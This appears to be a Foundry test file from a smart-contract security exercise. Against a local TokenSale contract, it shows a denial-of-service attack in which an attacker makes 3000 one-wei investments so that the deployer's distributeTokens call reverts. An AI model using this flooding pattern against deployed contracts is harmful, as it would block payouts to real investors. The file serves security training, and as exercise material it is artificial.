// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "forge-std/console.sol";
import "src/dos-1/TokenSale.sol";

/**
 * @dev run "forge test -vvv --match-contract DOS1"
 *  Note: This is a long running test prepare for ~20 sec.
 */
contract TestDOS1 is Test {
    uint256 constant USER1_INVESTMENT = 5 ether;
    uint256 constant USER2_INVESTMENT = 15 ether;
    uint256 constant USER3_INVESTMENT = 23 ether;

    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address attacker = makeAddr("attacker");

    TokenSale tokenSale;

    function setUp() public {
        /**
         * SETUP EXERCISE - DON'T CHANGE ANYTHING HERE
         */
        vm.prank(deployer);
        tokenSale = new TokenSale();

        vm.deal(user1, USER1_INVESTMENT);
        vm.prank(user1);
        tokenSale.invest{value: USER1_INVESTMENT}();

        vm.deal(user2, USER2_INVESTMENT);
        vm.prank(user2);
        tokenSale.invest{value: USER2_INVESTMENT}();

        vm.deal(user3, USER3_INVESTMENT);
        vm.prank(user3);
        tokenSale.invest{value: USER3_INVESTMENT}();

        assertEq(tokenSale.claimable(user1, 0), USER1_INVESTMENT * 5);
        assertEq(tokenSale.claimable(user2, 0), USER2_INVESTMENT * 5);
        assertEq(tokenSale.claimable(user3, 0), USER3_INVESTMENT * 5);
    }

    function testDosAttack() public {
        /**
         * CODE YOUR SOLUTION HERE
         */

        /**
         * SUCCESS CONDITIONS
         */
        vm.startPrank(attacker);
        uint256 attackerFunds = 3000;
        vm.deal(attacker, 3000);

        for (uint256 index = 0; index < attackerFunds; index++) {
            tokenSale.invest{value: 1}();
        }

        // DOS to distributeTokens
        vm.startPrank(deployer);
        vm.expectRevert();
        tokenSale.distributeTokens();
    }
}
